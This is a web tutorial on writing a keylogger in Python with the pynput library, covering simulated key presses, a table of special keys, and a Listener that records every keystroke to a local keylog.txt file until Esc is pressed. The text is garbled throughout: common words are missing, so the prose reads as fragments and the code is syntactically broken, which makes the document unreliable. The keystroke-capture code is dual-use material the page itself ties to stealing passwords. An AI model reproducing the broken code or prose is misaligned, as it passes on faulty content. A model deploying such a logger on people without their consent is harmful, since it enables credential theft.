next prev Creating Keylogger using Python Keyloggers type monitoring software utilized record keystrokes made user with their keyboard. They generally utilized monitor network utilization along with troubleshooting technical errors. contrary, malicious software utilizes keyloggers attempt retrieve usernames passwords different websites. following tutorial, will understand make simple keylogger using pynput library Python programming language. let's started. Understanding Python pynput library pynput library Python enables programmers control monitor input devices. This library consists sub-packages each type input device supported: mouse: This sub-package consists classes control monitor mouse trackpad. keyboard: This sub-package consists classes control monitor keyboard. order install Python library, need 'pip', framework maintain packages required install modules from trusted public repositories. Once have 'pip', install pynput library using command from command prompt (CMD) terminal shown below: Syntax: install pynput modules mentioned previously automatically imported into pynput package. them simply importing them from main package. Once pynput package installed, verify creating empty Python program file writing import statement follows: File: verify.py importing different modules from pynput library from pynput import keyboard, mouse Now, save above file execute using following command terminal: Syntax: python verify.py above Python program file does return error, library installed properly. However, case where exception raised, reinstalling library, also recommended refer official documentation library. following tutorial, will only discuss keyboard module pynput library that will serve purpose creating simple keylogger. first, understand some basics. Pressing Releasing Keyboards keys using Python first thing will learn control keyboard with help Python especially method pressing keys keyboard. There types keys that should concerned about: Regular Keys These keys include letters, numbers, signs. Special Keys These keys include space, shift, ctrl, many more. order start controlling keyboard, have create object Controller() class which will have press() release() methods. This class sends keyboard events system. consider simple example demonstrating same: Example importing different modules from pynput library from pynput.keyboard import Controller instantiating Controller class the_keyboard Controller() using press() release() methods the_keyboard.press('x') the_keyboard.release('x') Explanation: above snippet code, have imported Controller() class from keyboard module pynput library. have then created object Controller() class. have then used press() release() methods order type letter. result, above code will type wherever mouse cursor located. also designed press release time. output above snippet code will look like following: Output: python example1.py Moreover, also press release multiple keys. consider following example demonstrating same: Example importing different modules from pynput library from pynput.keyboard import Controller instantiating Controller class the_keyboard Controller() using press() release() methods the_keyboard.press('x') the_keyboard.release('x') the_keyboard.press('y') the_keyboard.release('y') the_keyboard.press('z') the_keyboard.release('z') Explanation: above snippet code, have pressed released multiple keys. result, will 'xyz' output. output above snippet code shown below: Output: python example2.py Now, understand handling special keys. Suppose want press space, Special keys like space called with help class from pynput library. class represents different buttons that correspond letters. This class consists modifier keys function keys. complete list special keys available following table. actual values these entities differ between platforms. Some platforms consist additional buttons; however, these guaranteed available everywhere. Keys Description This generic key. This considered modifier. alt_gr This AltGr key. This considered modifier. alt_l This left key. This considered modifier. alt_r This right key. This considered modifier. backspace This Backspace key. caps_lock This Caps Lock key. This generic command button. platforms, this button corresponds Super Windows key, Mac, corresponds Command key. This considered modifier. cmd_l This left command button. platforms, this button corresponds Super Windows key, Mac, corresponds Command key. This considered modifier. cmd_r This right command button. platforms, this button corresponds Super Windows key, Mac, corresponds Command key. This considered modifier. ctrl This generic Ctrl key. This considered modifier. ctrl_l This left Ctrl key. This considered modifier. ctrl_r This right Ctrl key. This considered modifier. delete This delete key. down This down arrow key. This key. enter This Enter Return key. esc This Esc key. This function key. keys ranging from F20 defined. home This Home key. insert This Insert key. This considered undefined some platforms. left This left arrow key. media_next This next track button. media_play_pause This play/pause toggle button. media_previous This previous track button. media_volume_down This volume down button. media_volume_mute This volume mute button. media_volume_up This volume button. menu This Menu key. This considered undefined some platforms. num_lock This Lock key. This considered undefined some platforms. page_down This Page Down key. page_up This Page key. pause This Pause/Break key. This considered undefined some platforms. print_screen This Print Screen key. This considered undefined some platforms. right This right arrow key. scroll_lock This Scroll Lock key. This considered undefined some platforms. shift This generic Shift key. This considered modifier. shift_l This left Shift key. This considered modifier. shift_r This right Shift key. This considered modifier. space This Space key. This key. This arrow key. consider following example demonstrating these special keys. Example importing different modules from pynput library from pynput.keyboard import Key, Controller instantiating Controller class the_keyboard Controller() using press() release() methods the_keyboard.press('x') the_keyboard.release('x') the_keyboard.press(Key.space) the_keyboard.release(Key.space) the_keyboard.press('y') the_keyboard.release('y') Output: python example3.py above snippet code, have imported Controller classes from pynput.keyboard module. instantiated Controller class used press() release() methods type some letters. have also used space with help class printed space between letters above method works special keys that press release. example, space, enter, many more. However, would deal with keys pressed while typing? take example Shift key, objective press "Xy" (capital order perform such functionality, Controller() class offers useful method known pressed(). consider following example demonstrating same: Example importing different modules from pynput library from pynput.keyboard import Key, Controller instantiating Controller class the_keyboard Controller() using press() release() methods with the_keyboard.pressed(Key.shift): the_keyboard.press('x') the_keyboard.release('x') the_keyboard.press('y') the_keyboard.release('y') Output: python example4.py Xy Explanation: above snippet code, have imported Controller classes from pynput.keyboard module. instantiated Controller class used pressed() method specifying shift from class with statement. have used press() release() type letter within this statement. have again used press() release() typed letter There different combinations keys available their requirements. configure code their needs; however, this general overview press release logic works control keyboard. Creating sample file create sample file store keys that press recorded keylogger. create sample file integrate into keylogging process. following snippet code demonstrates same: Example with open("keylog.txt", "w") log: log.write("This file.") Explanation: above snippet code, have used open() method create file "keylog.txt" with statement. have then used write() method write some text this file. Once execute above code, will keylog.txt file containing text: This file. would like Python record keys that press them this file following. Creating simple keylogger using Python know create file with some sample text. want Python write keys press store them into this file (rather than having same text there). first consider theoretically what want perform? need list that will keep appending keys that pressed keyboard. then, once pressed, will write this list file. understand working above statement with help following snippet code. File: keylogger.py importing required modules from pynput.keyboard import creating empty list store pressed keys the_keys creating function that defines what each press functionPerKey(key): appending each pressed list the_keys.append(key) writing list file after each pressed storeKeysToFile(the_keys) Explanation: above snippet code, have imported class from keyboard module pynput library. have then created empty list order store pressed keys. have then defined function functionPerKey() that provides instructions perform when pressed. have used append() function append each pressed list within this function. called another function storeKeysToFile() write list file after each pressed. However, this function still required defined. Remember that pressed comes "key" format, write file, must have String. Moreover, will require remove 'quotation' marks from each since each string, want join them together. consider following snippet code where will define another function that will write keys file. File: keylogger.py defining function write keys file storeKeysToFile(keys): creating keylog.txt file with write mode with open('keylog.txt', 'w') log: looping through each present list keys the_key keys: converting string removing quotation marks the_key str(the_key).replace("'", writing each keylog.txt file log.write(the_key) Explanation: above snippet code, have defined custom function storeKeysToFile() that accepts parameter. Within this function, have used created keylog.txt file with write mode with help open() method. have then used for-loop iterate through each present list keys converted them into strings removing quotation marks. then wrote each keylog.txt file using write() method. result, whenever pressed, Python will create keylog.txt file with list keys pressed from time script began running last pressed. leave code like will keep executing time. will define function consisting some stop combination keys that will stop logger. consider "Esc" stop this program. will jump into implementation. already know, whenever press "Esc", will added keylog.txt file. Thus, will define operation that must take place once release "Esc" after pressing consider following snippet code demonstrating such function's implementation. File: keylogger.py defining function perform operation each release onEachKeyRelease(the_key): case, "Esc" then stopping keylogger the_key Key.esc: return False Explanation: above snippet code, have defined function operate each release. Within this function, have used conditional statement check released "Esc" return False same. final step, will require putting together everything getting keylogger running. will require listening object keylogger. This object will record keyboard events. will using Listener() class from keyboard module pynput library perform this operation. Listener() class different arguments; however, will require only them. These arguments briefly described below: on_press This argument calls function perform when pressed. on_release This argument calls function perform when released. will assign above custom functions Listener() class parameters that join each pressed with each other. consider following snippet code that demonstrates implementation above statement. File: keylogger.py from pynput.keyboard import Listener with Listener( on_press functionPerKey, on_release onEachKeyRelease the_listener: the_listener.join() Explanation: above snippet code, have imported snippet code, have imported Listener() class from keyboard module pynput library. have then used Listener() class specifying parameters on_press functionPerKey on_release onEachKeyRelease. last, have joined these specified functions using join() method. coding 'Python Keylogger' program finally completed. save file program works. program, type following command command-line shell terminal: Command: python keylogger.py before output, here complete project code. Complete Program Code following program file complete code 'Python Keylogger' program. File: keylogger.py importing required modules from pynput.keyboard import from pynput.keyboard import Listener creating empty list store pressed keys the_keys creating function that defines what each press functionPerKey(key): appending each pressed list the_keys.append(key) writing list file after each pressed storeKeysToFile(the_keys) defining function write keys file storeKeysToFile(keys): creating keylog.txt file with write mode with open('keylog.txt', 'w') log: looping through each present list keys the_key keys: converting string removing quotation marks the_key str(the_key).replace("'", writing each keylog.txt file log.write(the_key) defining function perform operation each release onEachKeyRelease(the_key): case, "Esc" then stopping keylogger the_key Key.esc: return False with Listener( on_press functionPerKey, on_release onEachKeyRelease the_listener: the_listener.join() Output: python keylogger.py type something press enter print something Command prompt This simple keylogger program. press "Esc" stop keylogger Output 'keylog.txt' file: Next TopicQuandl package Python prev next